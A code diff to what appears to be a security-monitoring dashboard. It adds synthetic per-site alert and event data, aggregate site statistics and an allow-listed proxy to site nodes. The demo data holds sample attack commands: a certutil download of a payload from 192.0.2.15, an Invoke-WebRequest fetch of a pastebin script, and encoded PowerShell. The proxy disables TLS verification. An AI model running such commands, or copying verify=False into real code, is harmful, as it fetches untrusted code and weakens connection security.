@@ -873,48 +873,425 @@ def _demo_threat_intel_status() -> dict:
     }
 
 
-def _demo_nodes() -> dict:
-    """Synthetic multi-site data for the Sites tab."""
-    return {
-        "nodes": [
-            {
-                "url": "http://acme-node:8081",
-                "node_id": "acme-law",
-                "version": "0.8.0",
-                "status": "healthy",
-                "ledger_sequence": 347,
-                "ledger_head": "a3f2c9e1d4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1",
-                "last_anchor_at": _demo_iso(-0.2),
-                "last_anchor_items": 2,
-                "reachable": True,
-                "error": None,
-            },
-            {
-                "url": "http://dental-node:8081",
-                "node_id": "mainst-dental",
-                "version": "0.8.0",
-                "status": "healthy",
-                "ledger_sequence": 189,
-                "ledger_head": "b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3",
-                "last_anchor_at": _demo_iso(-0.3),
-                "last_anchor_items": 0,
-                "reachable": True,
-                "error": None,
-            },
-            {
-                "url": "http://harbor-node:8081",
-                "node_id": "harbor-ins",
-                "version": "0.7.9",
-                "status": "warning",
-                "ledger_sequence": 512,
-                "ledger_head": "c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4",
-                "last_anchor_at": _demo_iso(-1.5),
-                "last_anchor_items": 5,
-                "reachable": True,
-                "error": None,
-            },
+# ---------------------------------------------------------------------------
+# Phase 18 M4: Per-site demo data generators
+# ---------------------------------------------------------------------------
+_DEMO_SITE_HOSTS = {
+    "head-office": [
+        {"hostname": "RECEPTION-PC", "role": "workstation", "events": 12400, "uptime": "3d 8h 15m"},
+        {"hostname": "EXEC-LAPTOP", "role": "workstation", "events": 12180, "uptime": "1d 22h 45m"},
+    ],
+    "branch-north": [
+        {"hostname": "BRANCH-PC-01", "role": "workstation", "events": 4200, "uptime": "7d 2h 10m"},
+        {"hostname": "BRANCH-PC-02", "role": "workstation", "events": 3920, "uptime": "7d 2h 10m"},
+    ],
+    "warehouse": [
+        {"hostname": "SHIPPING-PC", "role": "workstation", "events": 18400, "uptime": "5d 11h 0m"},
+        {"hostname": "INVENTORY-SERVER", "role": "server", "events": 22100, "uptime": "14d 6h 30m"},
+        {"hostname": "LOGISTICS-DB", "role": "server", "events": 11840, "uptime": "14d 6h 30m"},
+    ],
+}
+
+_DEMO_SITE_ALERTS = {
+    "head-office": {
+        "severity": {"critical": 2, "high": 5, "medium": 4, "low": 3},
+        "top_rules": [
+            {"rule": "brute_force_password", "count": 5},
+            {"rule": "ps_encoded_command", "count": 3},
+            {"rule": "fim_file_modified", "count": 2},
         ],
+        "alerts_detail": [
+            {"offset": -6, "rule_id": "TS-001", "rule_name": "brute_force_password",
+             "severity": "critical", "host": "RECEPTION-PC",
+             "description": "12 failed logon attempts from 198.51.100.44 for user admin in 3 minutes",
+             "event_count": 12, "matched_events": 12},
+            {"offset": -4, "rule_id": "TS-030", "rule_name": "ps_encoded_command",
+             "severity": "critical", "host": "EXEC-LAPTOP",
+             "description": "PowerShell encoded command execution detected on attorney workstation",
+             "event_count": 2, "matched_events": 2},
+            {"offset": -3, "rule_id": "TS-030", "rule_name": "ps_encoded_command",
+             "severity": "high", "host": "RECEPTION-PC",
+             "description": "PowerShell encoded command: Invoke-WebRequest to external IP",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -2.5, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
+             "severity": "medium", "host": "RECEPTION-PC",
+             "description": "File modified: C:\\ClientFiles\\Active\\billing.xlsx",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -1, "rule_id": "TS-071", "rule_name": "rdp_brute_force",
+             "severity": "high", "host": "EXEC-LAPTOP",
+             "description": "Off-hours RDP connection attempt from 203.0.113.99",
+             "event_count": 3, "matched_events": 3},
+        ],
+    },
+    "branch-north": {
+        "severity": {"critical": 0, "high": 1, "medium": 1, "low": 1},
+        "top_rules": [
+            {"rule": "off_hours_logon", "count": 1},
+            {"rule": "local_account_created", "count": 1},
+        ],
+        "alerts_detail": [
+            {"offset": -8, "rule_id": "TS-040", "rule_name": "off_hours_logon",
+             "severity": "high", "host": "BRANCH-PC-01",
+             "description": "Logon outside business hours: user dental_admin at 02:14 AM",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -5, "rule_id": "TS-010", "rule_name": "local_account_created",
+             "severity": "medium", "host": "BRANCH-PC-02",
+             "description": "New local account created: xray_service",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -2, "rule_id": "TS-132", "rule_name": "scheduled_task_created",
+             "severity": "low", "host": "BRANCH-PC-01",
+             "description": "Scheduled task created: DentalSync_Backup",
+             "event_count": 1, "matched_events": 1},
+        ],
+    },
+    "warehouse": {
+        "severity": {"critical": 3, "high": 8, "medium": 12, "low": 8},
+        "top_rules": [
+            {"rule": "suspicious_powershell", "count": 6},
+            {"rule": "brute_force_password", "count": 5},
+            {"rule": "fim_file_modified", "count": 4},
+            {"rule": "defender_realtime_disabled", "count": 3},
+        ],
+        "alerts_detail": [
+            {"offset": -10, "rule_id": "TS-001", "rule_name": "brute_force_password",
+             "severity": "critical", "host": "INVENTORY-SERVER",
+             "description": "20 failed logon attempts from 192.0.2.15 for user claims_admin in 2 minutes",
+             "event_count": 20, "matched_events": 20},
+            {"offset": -8, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
+             "severity": "critical", "host": "LOGISTICS-DB",
+             "description": "File modified: C:\\PolicyData\\underwriting\\master_rates.xlsx — integrity violation",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -7, "rule_id": "TS-080", "rule_name": "defender_realtime_disabled",
+             "severity": "critical", "host": "SHIPPING-PC",
+             "description": "Windows Defender real-time protection disabled",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -5, "rule_id": "TS-030", "rule_name": "suspicious_powershell",
+             "severity": "high", "host": "SHIPPING-PC",
+             "description": "Suspicious PowerShell: certutil -urlcache -split -f http://192.0.2.15/payload",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -3, "rule_id": "TS-071", "rule_name": "rdp_brute_force",
+             "severity": "high", "host": "INVENTORY-SERVER",
+             "description": "Multiple RDP connections from external IP 203.0.113.88",
+             "event_count": 5, "matched_events": 5},
+            {"offset": -1.5, "rule_id": "TS-030", "rule_name": "suspicious_powershell",
+             "severity": "high", "host": "INVENTORY-SERVER",
+             "description": "PowerShell downloading from paste site: Invoke-WebRequest pastebin.com/raw/...",
+             "event_count": 1, "matched_events": 1},
+            {"offset": -0.5, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
+             "severity": "medium", "host": "LOGISTICS-DB",
+             "description": "File modified: C:\\PolicyData\\claims\\pending_review.csv",
+             "event_count": 1, "matched_events": 1},
+        ],
+    },
+}
+
+_DEMO_SITE_EVENTS = {
+    "head-office": [
+        {"channel": "Security", "event_id": "4625", "host": "RECEPTION-PC",
+         "message": "An account failed to log on. Subject: SYSTEM. Failure Reason: Unknown user name. Account: admin. Source: 198.51.100.44."},
+        {"channel": "Security", "event_id": "4624", "host": "EXEC-LAPTOP",
+         "message": "An account was successfully logged on. Subject: SYSTEM. Logon Type: 10. New Logon: partner1."},
+        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "host": "EXEC-LAPTOP",
+         "message": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -enc SQBuAH..."},
+        {"channel": "TinySocs-FIM", "event_id": "FIM", "host": "RECEPTION-PC",
+         "message": "File modified: C:\\ClientFiles\\Active\\billing.xlsx. Action: Modified."},
+        {"channel": "Security", "event_id": "4688", "host": "RECEPTION-PC",
+         "message": "A new process has been created. Creator: explorer.exe. New Process: outlook.exe."},
+    ],
+    "branch-north": [
+        {"channel": "Security", "event_id": "4624", "host": "BRANCH-PC-01",
+         "message": "An account was successfully logged on. Logon Type: 2. New Logon: dental_admin."},
+        {"channel": "Security", "event_id": "4720", "host": "BRANCH-PC-02",
+         "message": "A user account was created. New Account: xray_service. Created By: Administrator."},
+        {"channel": "System", "event_id": "7045", "host": "BRANCH-PC-01",
+         "message": "A service was installed: DentalSync_Backup. Service Type: user mode service."},
+        {"channel": "Security", "event_id": "4688", "host": "BRANCH-PC-02",
+         "message": "A new process has been created. Creator: services.exe. New Process: xray_imaging.exe."},
+    ],
+    "warehouse": [
+        {"channel": "Security", "event_id": "4625", "host": "INVENTORY-SERVER",
+         "message": "An account failed to log on. Failure Reason: Unknown user name. Account: claims_admin. Source: 192.0.2.15."},
+        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "host": "SHIPPING-PC",
+         "message": "Process Create: Image: certutil.exe CommandLine: certutil -urlcache -split -f http://192.0.2.15/payload"},
+        {"channel": "TinySocs-FIM", "event_id": "FIM", "host": "LOGISTICS-DB",
+         "message": "File modified: C:\\PolicyData\\underwriting\\master_rates.xlsx. Action: Modified. Hash changed."},
+        {"channel": "Security", "event_id": "4624", "host": "INVENTORY-SERVER",
+         "message": "An account was successfully logged on. Logon Type: 10. New Logon: claims_admin."},
+        {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104", "host": "INVENTORY-SERVER",
+         "message": "Script block logging: Invoke-WebRequest https://pastebin.com/raw/abc123 -OutFile C:\\Temp\\update.ps1"},
+        {"channel": "Security", "event_id": "5001", "host": "SHIPPING-PC",
+         "message": "Windows Defender Real-Time Protection was disabled."},
+    ],
+}
+
+
+def _demo_site_alerts_summary(site_id: str, hours: int = 24) -> dict:
+    """Per-site alert summary for drill-through."""
+    site = _DEMO_SITE_ALERTS.get(site_id)
+    if not site:
+        return {"error": f"Unknown site: {site_id}"}
+    sev = site["severity"]
+    total = sum(sev.values())
+    hosts = _DEMO_SITE_HOSTS.get(site_id, [])
+    host_counts = {}
+    for a in site.get("alerts_detail", []):
+        host_counts[a["host"]] = host_counts.get(a["host"], 0) + 1
+    return {
+        "hours": hours,
+        "total": total,
+        "severity": {k: v for k, v in sev.items() if v > 0},
+        "top_rules": site["top_rules"],
+        "top_hosts": [{"host": h, "count": c} for h, c in
+                      sorted(host_counts.items(), key=lambda x: -x[1])],
+        "error": None,
     }
+
+
+def _demo_site_alerts_timeline(site_id: str, hours: int = 24) -> dict:
+    """Per-site alert timeline for drill-through."""
+    site = _DEMO_SITE_ALERTS.get(site_id)
+    if not site:
+        return {"error": f"Unknown site: {site_id}"}
+    now = _demo_now()
+    td = __import__("datetime").timedelta
+    sev = site["severity"]
+    total = sum(sev.values())
+    # Scale factor: distribute alerts across hours with business-hours bias
+    scale = max(1, total / 12)  # rough average per-hour
+    buckets = []
+    for i in range(hours):
+        t = now + td(hours=-(hours - 1 - i))
+        hour = t.hour
+        if 8 <= hour <= 17:
+            base = max(0, int(scale * random.uniform(0.5, 1.5)))
+        elif 22 <= hour or hour <= 5:
+            base = max(0, int(scale * random.uniform(0, 0.3)))
+        else:
+            base = max(0, int(scale * random.uniform(0.2, 0.7)))
+        bsev = {}
+        if base > 0:
+            crit_ratio = sev.get("critical", 0) / max(1, total)
+            high_ratio = sev.get("high", 0) / max(1, total)
+            bsev_crit = max(0, int(base * crit_ratio + random.uniform(-0.5, 0.5)))
+            bsev_high = max(0, int(base * high_ratio + random.uniform(-0.5, 0.5)))
+            bsev_other = max(0, base - bsev_crit - bsev_high)
+            if bsev_crit > 0:
+                bsev["critical"] = bsev_crit
+            if bsev_high > 0:
+                bsev["high"] = bsev_high
+            if bsev_other > 0:
+                bsev["medium"] = bsev_other
+        buckets.append({
+            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
+            "count": base,
+            "severity": bsev,
+        })
+    return {"hours": hours, "buckets": buckets, "error": None}
+
+
+def _demo_site_fleet_health(site_id: str) -> dict:
+    """Per-site fleet health for drill-through."""
+    hosts_cfg = _DEMO_SITE_HOSTS.get(site_id)
+    if not hosts_cfg:
+        return {"error": f"Unknown site: {site_id}"}
+    site_alerts = _DEMO_SITE_ALERTS.get(site_id, {})
+    # Count alerts per host
+    host_alert_counts: Dict[str, Dict[str, int]] = {}
+    for a in site_alerts.get("alerts_detail", []):
+        h = a["host"]
+        if h not in host_alert_counts:
+            host_alert_counts[h] = {"total": 0}
+        host_alert_counts[h]["total"] += 1
+        s = a["severity"]
+        host_alert_counts[h][s] = host_alert_counts[h].get(s, 0) + 1
+
+    hosts = []
+    for hcfg in hosts_cfg:
+        hn = hcfg["hostname"]
+        ac = host_alert_counts.get(hn, {"total": 0})
+        sev_dict = {k: v for k, v in ac.items() if k != "total"}
+        hosts.append({
+            "hostname": hn,
+            "event_count": hcfg["events"],
+            "last_seen": _demo_iso(-0.02),
+            "first_seen": _demo_iso(-23.5),
+            "alert_count": ac.get("total", 0),
+            "alert_severities": sev_dict,
+            "active_detections": [],
+            "top_channels": [
+                {"channel": "Security", "count": int(hcfg["events"] * 0.55)},
+                {"channel": "Microsoft-Windows-Sysmon/Operational", "count": int(hcfg["events"] * 0.30)},
+                {"channel": "System", "count": int(hcfg["events"] * 0.15)},
+            ],
+            "top_event_ids": [
+                {"event_id": "4624", "count": int(hcfg["events"] * 0.25)},
+                {"event_id": "1", "count": int(hcfg["events"] * 0.20)},
+            ],
+            "agent_version": "0.8.0" if site_id != "warehouse" else "0.7.9",
+            "node_id": site_id,
+            "uptime": hcfg["uptime"],
+            "events_shipped": hcfg["events"],
+            "queue_files": 0,
+            "queue_bytes": 0,
+            "last_ship_time": _demo_iso(-0.02),
+            "heartbeat_ts": _demo_iso(-0.01),
+        })
+    return {"hosts": hosts, "error": None}
+
+
+def _demo_site_detections_fired(site_id: str, hours: int = 24, limit: int = 50) -> dict:
+    """Per-site fired detections for drill-through."""
+    site = _DEMO_SITE_ALERTS.get(site_id)
+    if not site:
+        return {"error": f"Unknown site: {site_id}"}
+    detections = []
+    for idx, a in enumerate(site.get("alerts_detail", [])):
+        det_id = f"demo-{site_id}-{idx:04d}"
+        alert_id = f"{a['rule_id']}|{a['host']}|{_demo_iso(a['offset'])}"
+        detections.append({
+            "id": det_id,
+            "alert_id": alert_id,
+            "rule_id": a["rule_id"],
+            "rule_name": a["rule_name"],
+            "severity": a["severity"],
+            "description": a["description"],
+            "event_count": a["event_count"],
+            "first_seen": _demo_iso(a["offset"] - 0.1),
+            "last_seen": _demo_iso(a["offset"]),
+            "timestamp": _demo_iso(a["offset"]),
+            "host": a["host"],
+            "matched_events": a["matched_events"],
+            "status": "new",
+            "tags": [],
+            "notes": "",
+        })
+    return {"detections": detections[:limit], "total": len(detections), "error": None}
+
+
+def _demo_site_events_recent(site_id: str, limit: int = 50) -> dict:
+    """Per-site recent events for drill-through."""
+    templates = _DEMO_SITE_EVENTS.get(site_id)
+    if not templates:
+        return {"error": f"Unknown site: {site_id}"}
+    td = __import__("datetime").timedelta
+    now = _demo_now()
+    events = []
+    for i in range(min(limit, 50)):
+        tmpl = templates[i % len(templates)]
+        t = now - td(minutes=random.randint(1, 1400))
+        events.append({
+            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
+            "host": tmpl["host"],
+            "channel": tmpl["channel"],
+            "event_id": tmpl["event_id"],
+            "message": tmpl["message"][:300],
+        })
+    events.sort(key=lambda e: e["timestamp"], reverse=True)
+    return {"events": events, "total": len(events), "index": "tinysocs-winlog-*", "error": None}
+
+
+def _demo_site_host_timeline(site_id: str, hostname: str = "", hours: int = 24) -> dict:
+    """Per-site host timeline for drill-through."""
+    hosts_cfg = _DEMO_SITE_HOSTS.get(site_id)
+    if not hosts_cfg:
+        return {"error": f"Unknown site: {site_id}"}
+    now = _demo_now()
+    td = __import__("datetime").timedelta
+    channels = ["Security", "Microsoft-Windows-Sysmon/Operational", "System"]
+    # Scale based on site size
+    host_events = {h["hostname"]: h["events"] for h in hosts_cfg}
+    total_events = sum(host_events.values())
+    scale = total_events / max(1, len(hosts_cfg)) / 24  # rough hourly average per host
+    buckets = []
+    for i in range(hours):
+        t = now + td(hours=-(hours - 1 - i))
+        hour = t.hour
+        if 8 <= hour <= 17:
+            mult = random.uniform(1.0, 2.0)
+        else:
+            mult = random.uniform(0.2, 0.6)
+        sec = max(0, int(scale * 0.55 * mult))
+        sys_ch = max(0, int(scale * 0.30 * mult))
+        other = max(0, int(scale * 0.15 * mult))
+        ch = {"Security": sec, "Microsoft-Windows-Sysmon/Operational": sys_ch}
+        if other > 0:
+            ch["System"] = other
+        buckets.append({
+            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
+            "count": sum(ch.values()),
+            "channels": ch,
+        })
+    return {
+        "hostname": hostname,
+        "hours": hours,
+        "interval": "1h",
+        "buckets": buckets,
+        "channels": sorted(channels),
+        "error": None,
+    }
+
+
+def _demo_nodes() -> dict:
+    """Synthetic multi-site data for the Sites tab (Phase 18: enriched with operational data)."""
+    nodes = [
+        {
+            "url": "http://acme-node:8081",
+            "node_id": "head-office",
+            "version": "0.8.0",
+            "status": "healthy",
+            "ledger_sequence": 347,
+            "ledger_head": "a3f2c9e1d4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1",
+            "last_anchor_at": _demo_iso(-0.2),
+            "last_anchor_items": 2,
+            "reachable": True,
+            "error": None,
+            # Phase 18 M1: operational data
+            "alerts_24h": 14, "alerts_critical": 2, "alerts_high": 5,
+            "top_rule": "brute_force_password", "host_count": 2,
+            "total_events_24h": 24580,
+        },
+        {
+            "url": "http://dental-node:8081",
+            "node_id": "branch-north",
+            "version": "0.8.0",
+            "status": "healthy",
+            "ledger_sequence": 189,
+            "ledger_head": "b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3",
+            "last_anchor_at": _demo_iso(-0.3),
+            "last_anchor_items": 0,
+            "reachable": True,
+            "error": None,
+            "alerts_24h": 3, "alerts_critical": 0, "alerts_high": 1,
+            "top_rule": "off_hours_logon", "host_count": 2,
+            "total_events_24h": 8120,
+        },
+        {
+            "url": "http://harbor-node:8081",
+            "node_id": "warehouse",
+            "version": "0.7.9",
+            "status": "warning",
+            "ledger_sequence": 512,
+            "ledger_head": "c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4",
+            "last_anchor_at": _demo_iso(-1.5),
+            "last_anchor_items": 5,
+            "reachable": True,
+            "error": None,
+            "alerts_24h": 31, "alerts_critical": 3, "alerts_high": 8,
+            "top_rule": "suspicious_powershell", "host_count": 3,
+            "total_events_24h": 52340,
+        },
+    ]
+    # Compute aggregate
+    agg = {
+        "total_alerts_24h": sum(n["alerts_24h"] for n in nodes),
+        "total_critical": sum(n["alerts_critical"] for n in nodes),
+        "total_high": sum(n["alerts_high"] for n in nodes),
+        "total_hosts": sum(n["host_count"] for n in nodes),
+        "sites_healthy": sum(1 for n in nodes if n["status"] == "healthy"),
+        "sites_warning": sum(1 for n in nodes if n["status"] == "warning"),
+        "sites_unreachable": 0,
+    }
+    return {"nodes": nodes, "aggregate": agg}
 
 
 # ---------------------------------------------------------------------------
@@ -1749,9 +2126,10 @@ async def api_fleet_health():
 
 
 # ---------------------------------------------------------------------------
-# Node / Sites API (Phase 17 M1 — Federation visibility)
+# Node / Sites API (Phase 17 M1 + Phase 18 M1 — Federation visibility)
 # ---------------------------------------------------------------------------
 _NODES_LIST: Optional[List[str]] = None
+_node_id_to_url: Dict[str, str] = {}  # Phase 18 M3: cache for proxy lookups
 
 
 def _get_node_urls() -> List[str]:
@@ -1762,16 +2140,26 @@ def _get_node_urls() -> List[str]:
     return _NODES_LIST
 
 
+async def _fetch_node_json(client: Any, url: str, path: str) -> Optional[Dict[str, Any]]:
+    """Fetch JSON from a node endpoint, returning None on any failure."""
+    try:
+        resp = await client.get(f"{url.rstrip('/')}{path}")
+        return resp.json()
+    except Exception:
+        return None
+
+
 @dashboard_app.get("/api/nodes")
 async def api_nodes():
-    """Return health and ledger status for all configured TinySocs nodes."""
+    """Return health, ledger, and operational status for all configured nodes."""
     if _DEMO_MODE:
         return _demo_nodes()
 
     node_urls = _get_node_urls()
     if not node_urls:
-        return {"nodes": []}
+        return {"nodes": [], "aggregate": None}
 
+    import asyncio as _aio
     import httpx
     nodes_out: List[Dict[str, Any]] = []
 
@@ -1781,28 +2169,51 @@ async def api_nodes():
                 "url": url, "node_id": "", "version": "", "status": "unreachable",
                 "ledger_sequence": 0, "ledger_head": "", "last_anchor_at": "",
                 "last_anchor_items": 0, "reachable": False, "error": None,
+                # Phase 18 M1: operational data (null = not available)
+                "alerts_24h": None, "alerts_critical": None, "alerts_high": None,
+                "top_rule": None, "host_count": None, "total_events_24h": None,
             }
-            # Call /meta (no HMAC needed)
-            try:
-                meta_resp = await client.get(f"{url.rstrip('/')}/meta")
-                meta = meta_resp.json()
-                node_info["node_id"] = meta.get("node_id", "")
-                node_info["version"] = meta.get("version", "")
-                node_info["reachable"] = True
-            except Exception as exc:
-                node_info["error"] = f"Cannot reach {url}: {type(exc).__name__}"
+
+            # Fetch /meta, /evidence/head, /alerts/summary, /fleet/summary concurrently
+            meta_data, head_data, alerts_data, fleet_data = await _aio.gather(
+                _fetch_node_json(client, url, "/meta"),
+                _fetch_node_json(client, url, "/evidence/head"),
+                _fetch_node_json(client, url, "/alerts/summary"),
+                _fetch_node_json(client, url, "/fleet/summary"),
+            )
+
+            # Process /meta
+            if meta_data is None:
+                node_info["error"] = f"Cannot reach {url}"
                 nodes_out.append(node_info)
                 continue
 
-            # Call /evidence/head (no HMAC needed)
-            try:
-                head_resp = await client.get(f"{url.rstrip('/')}/evidence/head")
-                head = head_resp.json()
-                if head.get("ok"):
-                    node_info["ledger_sequence"] = head.get("sequence", 0)
-                    node_info["ledger_head"] = head.get("head_sha256", "")
-            except Exception:
-                pass
+            node_info["node_id"] = meta_data.get("node_id", "")
+            node_info["version"] = meta_data.get("version", "")
+            node_info["reachable"] = True
+
+            # Update node_id → url cache for proxy lookups
+            if node_info["node_id"]:
+                _node_id_to_url[node_info["node_id"]] = url
+
+            # Process /evidence/head
+            if head_data and head_data.get("ok"):
+                node_info["ledger_sequence"] = head_data.get("sequence", 0)
+                node_info["ledger_head"] = head_data.get("head_sha256", "")
+
+            # Process /alerts/summary (Phase 18 M1)
+            if alerts_data and not alerts_data.get("error"):
+                node_info["alerts_24h"] = alerts_data.get("total", 0)
+                sev = alerts_data.get("severity", {})
+                node_info["alerts_critical"] = sev.get("critical", 0)
+                node_info["alerts_high"] = sev.get("high", 0)
+                top_rules = alerts_data.get("top_rules", [])
+                node_info["top_rule"] = top_rules[0]["rule"] if top_rules else ""
+
+            # Process /fleet/summary (Phase 18 M1)
+            if fleet_data and not fleet_data.get("error"):
+                node_info["host_count"] = fleet_data.get("host_count", 0)
+                node_info["total_events_24h"] = fleet_data.get("total_events_24h", 0)
 
             # Query local anchors index for latest anchor for this node
             nid = node_info["node_id"]
@@ -1836,7 +2247,128 @@ async def api_nodes():
 
             nodes_out.append(node_info)
 
-    return {"nodes": nodes_out}
+    # Phase 18 M1: compute aggregate summary across all reachable nodes
+    agg = {
+        "total_alerts_24h": 0, "total_critical": 0, "total_high": 0,
+        "total_hosts": 0, "sites_healthy": 0, "sites_warning": 0,
+        "sites_unreachable": 0,
+    }
+    for n in nodes_out:
+        status = n.get("status", "unreachable")
+        if status == "healthy":
+            agg["sites_healthy"] += 1
+        elif status == "warning":
+            agg["sites_warning"] += 1
+        else:
+            agg["sites_unreachable"] += 1
+        if n.get("alerts_24h") is not None:
+            agg["total_alerts_24h"] += n["alerts_24h"]
+        if n.get("alerts_critical") is not None:
+            agg["total_critical"] += n["alerts_critical"]
+        if n.get("alerts_high") is not None:
+            agg["total_high"] += n["alerts_high"]
+        if n.get("host_count") is not None:
+            agg["total_hosts"] += n["host_count"]
+
+    return {"nodes": nodes_out, "aggregate": agg}
+
+
+# ---------------------------------------------------------------------------
+# Site Proxy — drill-through to individual nodes (Phase 18 M3)
+# ---------------------------------------------------------------------------
+# Allowed proxy paths — only forward requests to known node endpoints.
+_PROXY_ALLOWED = {
+    "alerts/summary", "alerts/timeline", "fleet/summary", "fleet/health",
+    "detections/fired", "events/recent", "host/timeline",
+}
+
+
+@dashboard_app.get("/api/site/{node_id}/{path:path}")
+async def api_site_proxy(node_id: str, path: str, request: Request):
+    """Proxy a request to a specific node's API.
+
+    Only proxies to URLs listed in TINYSOCS_NODES.  Not an open proxy.
+    In demo mode, dispatches to per-site demo data generators (M4).
+    """
+    # Normalise path (strip leading/trailing slashes)
+    path = path.strip("/")
+
+    # Demo mode — delegate to per-site demo handlers (M4)
+    if _DEMO_MODE:
+        return _demo_site_proxy(node_id, path, dict(request.query_params))
+
+    # Security: only proxy to allowed endpoint paths
+    if path not in _PROXY_ALLOWED:
+        return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})
+
+    # Look up the node URL
+    url = _node_id_to_url.get(node_id)
+    if url is None:
+        # Cache may not be populated yet — try refreshing
+        for node_url in _get_node_urls():
+            try:
+                import httpx as _hx
+                resp = _hx.get(f"{node_url.rstrip('/')}/meta", timeout=3, verify=False)
+                meta = resp.json()
+                nid = meta.get("node_id", "")
+                if nid:
+                    _node_id_to_url[nid] = node_url
+            except Exception:
+                pass
+        url = _node_id_to_url.get(node_id)
+
+    if url is None:
+        return JSONResponse(status_code=404, content={"error": f"Unknown site: {node_id}"})
+
+    # Forward the request
+    qs = str(request.query_params)
+    target = f"{url.rstrip('/')}/{path}" + (f"?{qs}" if qs else "")
+    try:
+        import httpx as _hx
+        async with _hx.AsyncClient(verify=False, timeout=10.0) as client:
+            resp = await client.get(target)
+            return JSONResponse(status_code=resp.status_code, content=resp.json())
+    except Exception as exc:
+        return JSONResponse(status_code=502, content={"error": f"Site unreachable: {exc}"})
+
+
+def _demo_site_proxy(node_id: str, path: str, params: dict) -> Any:
+    """Phase 18 M4 — per-site demo data routing.
+
+    Dispatches to per-site demo data generators based on node_id and path.
+    """
+    demo_sites = {"head-office", "branch-north", "warehouse"}
+    if node_id not in demo_sites:
+        return JSONResponse(status_code=404, content={"error": f"Unknown site: {node_id}"})
+    if path not in _PROXY_ALLOWED:
+        return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})
+
+    hours = int(params.get("hours", "24"))
+    limit = int(params.get("limit", "50"))
+    hostname = params.get("hostname", "")
+
+    if path == "alerts/summary":
+        return _demo_site_alerts_summary(node_id, hours)
+    elif path == "alerts/timeline":
+        return _demo_site_alerts_timeline(node_id, hours)
+    elif path == "fleet/summary":
+        hosts = _DEMO_SITE_HOSTS.get(node_id, [])
+        return {
+            "host_count": len(hosts),
+            "total_events_24h": sum(h["events"] for h in hosts),
+            "hosts": [{"hostname": h["hostname"],
+                       "events_24h": h["events"],
+                       "last_seen": _demo_iso(-0.02)} for h in hosts],
+        }
+    elif path == "fleet/health":
+        return _demo_site_fleet_health(node_id)
+    elif path == "detections/fired":
+        return _demo_site_detections_fired(node_id, hours, limit)
+    elif path == "events/recent":
+        return _demo_site_events_recent(node_id, limit)
+    elif path == "host/timeline":
+        return _demo_site_host_timeline(node_id, hostname, hours)
+    return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})
 
 
 # ---------------------------------------------------------------------------
@@ -3632,6 +4164,35 @@ a { color: var(--accent); text-decoration: none; }
 .site-badge { display:inline-block; font-size:10px; padding:1px 6px; border-radius:4px; font-weight:600; }
 .site-badge.outdated { background:rgba(245,158,11,0.15); color:#f59e0b; }
 .site-error { font-size:11px; color:#ef4444; margin-top:6px; }
+.site-card.has-critical { border-left:3px solid #e74c3c; }
+.site-card { cursor:pointer; }
+.site-alert-badge { display:inline-flex; align-items:center; justify-content:center;
+                    min-width:22px; height:22px; padding:0 5px; border-radius:11px;
+                    font-size:11px; font-weight:700; color:#fff; flex-shrink:0; margin-left:auto; }
+.site-alert-badge.crit { background:#e74c3c; }
+.site-alert-badge.high { background:#e67e22; }
+.site-alert-badge.none { background:#555; }
+.site-ops { font-size:11px; color:var(--muted); margin-top:6px; line-height:1.7; }
+.site-ops .sev-line span { font-weight:600; }
+.site-ops .sev-crit { color:#e74c3c; }
+.site-ops .sev-high { color:#e67e22; }
+.sites-aggregate { display:flex; align-items:center; gap:16px; padding:10px 14px; background:var(--surface);
+                   border:1px solid var(--border); border-radius:8px; margin-bottom:12px; font-size:13px;
+                   cursor:pointer; transition:border-color 0.15s; flex-wrap:wrap; }
+.sites-aggregate:hover { border-color:var(--accent); }
+.sites-aggregate .agg-val { font-weight:700; color:var(--text); }
+.sites-aggregate .agg-crit { color:#e74c3c; font-weight:700; }
+.sites-aggregate .agg-sep { color:var(--border); }
+/* Site focus banner (Phase 18 M3 — drill-through mode) */
+.site-focus-banner { display:none; position:sticky; z-index:18; padding:6px 14px;
+                     background:var(--surface); border-bottom:1px solid var(--border);
+                     border-left:3px solid var(--accent); font-size:13px;
+                     align-items:center; gap:10px; }
+.site-focus-banner.visible { display:flex; }
+.site-focus-banner .sfb-back { cursor:pointer; color:var(--accent); font-weight:500;
+                               text-decoration:none; white-space:nowrap; }
+.site-focus-banner .sfb-back:hover { text-decoration:underline; }
+.site-focus-banner .sfb-label { color:var(--text); font-weight:600; }
 /* Multi-select host picker dropdown */
 .host-picker { position:relative; display:inline-block; }
 .host-picker-btn, .timeline-controls select {
@@ -4110,6 +4671,12 @@ select { cursor: pointer; }
 <div class="main-layout">
   <div class="left-panels">
 
+    <!-- Site Focus Banner (Phase 18 M3 — drill-through mode) -->
+    <div class="site-focus-banner" id="siteFocusBanner">
+      <a class="sfb-back" onclick="unfocusSite()">&larr; All Sites</a>
